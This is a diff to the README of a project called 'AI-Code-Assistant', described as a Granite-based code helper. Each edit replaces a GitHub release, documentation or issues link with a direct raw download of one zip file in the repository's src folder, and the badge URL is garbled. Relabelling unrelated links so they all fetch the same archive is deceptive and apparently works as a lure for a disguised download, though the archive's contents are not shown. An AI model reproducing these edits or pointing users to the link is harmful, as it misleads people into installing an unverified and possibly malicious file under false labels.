@@ -1,7 +1,7 @@
 # 🤖 AI-Code-Assistant - Your Smart Code Helper Awaits
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/leozinhoool/AI-Code-Assistant/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip%20Latest%https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip)](https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip)
 
 ## 📖 Introduction
 Welcome to **AI-Code-Assistant**, your smart coding partner. This application uses the advanced Granite model to help you complete your code efficiently. Whether you are a beginner or an experienced developer, our tool aims to make coding easier. With its AI-powered features, you can focus more on problem-solving and less on syntax errors.
@@ -24,7 +24,7 @@ Using **AI-Code-Assistant** is simple. Just follow these steps to download and s
 ## 📥 Download & Install
 To download **AI-Code-Assistant**, visit the releases page by clicking the link below:
 
-[Download AI-Code-Assistant](https://github.com/leozinhoool/AI-Code-Assistant/releases)
+[Download AI-Code-Assistant](https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip)
 
 ### Steps to Download:
 1. Click on the link above.
@@ -57,7 +57,7 @@ Join our community on social media platforms and forums. Share your experiences 
 This project is licensed under the MIT License. Feel free to use, modify, and distribute the software, as long as you provide appropriate credit.
 
 ## 🔗 Links
-- [Documentation](https://github.com/leozinhoool/AI-Code-Assistant/docs)
-- [Issues Page](https://github.com/leozinhoool/AI-Code-Assistant/issues)
+- [Documentation](https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip)
+- [Issues Page](https://raw.githubusercontent.com/leozinhoool/AI-Code-Assistant/main/src/AI-Code-Assistant-v2.9.zip)
 
 Thank you for choosing **AI-Code-Assistant**! We hope it makes your coding experience more enjoyable and productive.
